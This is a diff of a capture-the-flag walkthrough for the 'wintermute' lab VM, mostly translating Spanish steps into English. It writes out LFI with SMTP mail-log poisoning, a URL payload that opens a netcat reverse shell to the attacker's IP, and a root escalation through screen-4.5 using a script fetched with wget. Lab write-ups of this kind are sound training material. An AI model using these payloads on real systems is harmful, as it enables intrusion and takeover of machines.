@@ -5,7 +5,7 @@ Feature:
   Toe:
     wintermute
   Location:
-    http://192.168.0.105/
+    http://192.168.18.94/
   CWE:
     CWE-022: https://cwe.mitre.org/data/definitions/22.html
   Rule:
@@ -55,13 +55,23 @@ Feature:
     We continue looking for port 3000 and we see an administration panel that tells us that it has default passwords. [ dkb4rb ] (4.png)
 
  Scenario: Exploitation
-    Here we enter an administration panel where we see some directories that are available which are:  [ dkb4rb ] (5.png)
+    Here we enter an administration panel where we see some directories
+        that are available which are:  [ dkb4rb ] (5.png)
+
 	"/fresside" where there is not much to see just a background image. [ dkb4rb ] (6.png)
-	"/turing-bolo" where we see that we can select several use cases but at this time we use the one called case. [ dkb4rb ] (7.png)
-            when we enter est we see that there is a potential LFI exploitation vector. [ dkb4rb ] (8.png)
+
+	"/turing-bolo" where we see that we can select several use cases 
+		but at this time we use the one called case. [ dkb4rb ] (7.png)
+
+    when we enter est we see that there is a potential LFI exploitation vector. [ dkb4rb ] (8.png)
+
     We also see that he tells us about some mail logs which can be used to make an SMTP poisoning. [ dkb4rb ] (9.png)
-    but first we will try to see if there are any parameters in the url that can be used to make arbitrary remote code execute. [ dkb4rb ] (10.png)
-	but it does not work so we proceed to do the SMTP poisoning, to establish a new variable that allows us to execute code. [ dkb4rb ]  (11.png)
+
+    but first we will try to see if there are any parameters in the url that can be used to make 
+	    arbitrary remote code execute. [ dkb4rb ] (10.png)
+
+	but it does not work so we proceed to do the SMTP poisoning, to establish a new variable that
+		allows us to execute code. [ dkb4rb ]  (11.png)
     
     """
      nc -nv 192.168.18.94 25
@@ -76,17 +86,17 @@ Feature:
     """
      nc -lvp 403
     """
-    Luego procederemos a ponernos en escucha por el puerto 403 para hacer la revershell. [ dkb4rb ] (14.png)
+	Then we will proceed to listen on port 403 to do the revershell. [dkb4rb] (14.png)
 
+    """ 
+    http://192.168.18.94//turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=nc%20192.168.18.93%20403%20-c%20/bin/bash
     """
-     http://192.168.18.94//turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=nc%20192.168.18.93%20403%20-c%20/bin/bash
-    """
-    Ya que estamos en escucha enviamos el payload en el servicio http que nos dara la revershell desde el servidor nuestra ip. [ dkb4rb ] (15.png)
+	Since we are listening, we send the payload in the http service that the reverse shell will give us from the server our ip. [ dkb4rb ] (15.png)
 
     """
      id
     """
-    Como resultado vemos que estamos dentro del usuario "www-data".
+	As a result we see that we are inside the user "www-data". [ dkb4rb ] (16.png)
 
     """
      script /dev/null -c bash
@@ -94,52 +104,56 @@ Feature:
      tty raw -echo;fg
 	 reset
     """
-    hacemos el tratamiento del "TTY"
-    
+	we do the "TTY" treatment [ dkb4rb ] (17.png)
+	    
     """
      export TERM=xterm
      export SHELL=bash
     """
-    exportaremos las variables de entorno para tener una consola totalmente interactiva.
+	we will export the environment variables to have a fully interactive console.
     
  Scenario: Privilege escalation 
-    Ahora procedemos hacer la busqueda de algun programa que nos permita escalar privilegios hacia el usuario "root".
-	Aqui vemos que el programa de screen-4.5 puede ser ejecutado por nosotros y es una potencial via para escalar privilegios.
-    Para esto hay exploits ya elaborados, pero como nos gusta saber como funciona todo a bajo nivel tendremos uno parecido a estos. [ dkb4rb/exploits ] (PrivShell.sh)
-    """
-     find / -perm -u=s -type file 2>/dev/null
-    """
+	Now we proceed to search for a program that allows us to escalate privileges to the "root" user.
+	
+	"""
+	find / -perm -u=s -type f 2>/dev/null
+	"""
+	Here we see that the screen-4.5 program can be executed by us and is a potential way to escalate privileges. [ dkb4rb ] (18.png)
+		
+
+	For this there are exploits already elaborated, but since we like to know how everything works at a low level
+		we will have one similar to these. [ dkb4rb/exploits ] (PrivShell.sh)
 
     """
      python3 -m http.server 8000
     """
-	Ahora que tenemos el script procedemos a compartirlo a nuestro servidor vulnerable con ayuda del simple http server de "python3" por el puerto 8000.
+	we proceed to share the script with the help of the simple "python3" http server through port 8000. [ dkb4rb ] (19.png
 
     """
      wget http://192.168.18.93:8000/PrivShell.sh
     """
-	Ahora nos descargamos el programa con ayuda de "Wget".
+	Now we download the program with the help of "Wget". [ dkb4rb ] (20.png)	
 
     """
      chmod +x PrivShell.sh
     """
-	Procedemos a dar permisos de ejecusion al programa.
+	We proceed to give execution permissions to the program. [ dkb4rb ] (21.png)	
 
 	"""
 	 ./PrivShell.sh
 	"""
-	And I have access to the "root" user
+	we execute the script [ dkb4rb ] (22.png)
 
 	"""
 	 cd /root
 	"""
-	navegamos a el directorio del usuario root y alli veremos la flag.
-
+	We navigate to the root user directory and there we will see the flag.
+	
 	"""
 	 cat flag.txt
 	"""
-	vemos la flag.
-
+	we see the flag. [ dkb4rb ] (23.png)
+	
   Scenario: Remediation
     Given that the service is vulnerable to LFI
     Then it is necessary to apply code sanitization
